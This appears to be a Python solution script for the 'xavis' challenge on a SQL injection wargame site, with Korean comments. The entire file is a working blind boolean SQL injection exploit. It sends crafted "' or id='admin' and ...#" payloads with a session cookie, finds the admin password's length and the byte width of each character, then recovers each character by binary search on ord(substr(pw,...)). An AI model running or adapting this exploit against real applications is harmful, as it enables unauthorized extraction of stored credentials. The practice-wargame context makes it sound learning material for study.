import requests

url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php"
cookies = {"PHPSESSID" : "1t87momi7f10m7tl6kkv6t0lob"}
params = {"pw" : None}

# 비밀번호 길이 구하기
for i in range(30):
    payload="' or id='admin' and length(pw)={}#".format(i)
    print(payload)
    params["pw"] = payload
    response = requests.get(url,params=params,cookies=cookies)
    if("Hello admin" in response.text):
        print("find the pw_length",i)
        break

# 길이 12자리
pw_length = 12
current_length = 0
idx = 0
flag = []
while(current_length<pw_length):
    idx = idx + 1
    # substr으로 한글자씩 자르면서 그 글자가 몇 글자인지 체크(한글이면 3글자, 영어 숫자면 1글자)
    for i in range(1,5):
        payload = "' or id='admin' and length(substr(pw,{},1))={}#".format(idx,i)
        params["pw"] = payload
        response = requests.get(url,params=params,cookies=cookies)
        if("Hello admin" in response.text):
            current_length = current_length + i
            print("{}번째 한글자는 {}바이트 짜리".format(idx,i))
            break
    
    # 찾아야 할 숫자의 범위가 매우 크므로 이진탐색 알고리즘 적용
    start,end=0,2**32       # 0 부터 4byte까지를 범위로 설정
    while True:
        search = int((start + end)/2)
        payload = "' or id='admin' and ord(substr(pw,{},1))<={}#".format(idx,search)
        params["pw"] = payload
        response = requests.get(url,params=params,cookies=cookies)
        if("Hello admin" in response.text):
            print("[+]",payload)
            payload = "' or id='admin' and ord(substr(pw,{},1))={}#".format(idx,search)
            params["pw"] = payload
            response = requests.get(url,params=params,cookies=cookies)
            if("Hello admin" in response.text):
                flag.append(search)
                print("[+++] find the flag",flag)
                break
            end = search
        else:
            print("[-]",payload)
            start = search

for i in flag:
    print(chr(i),end='')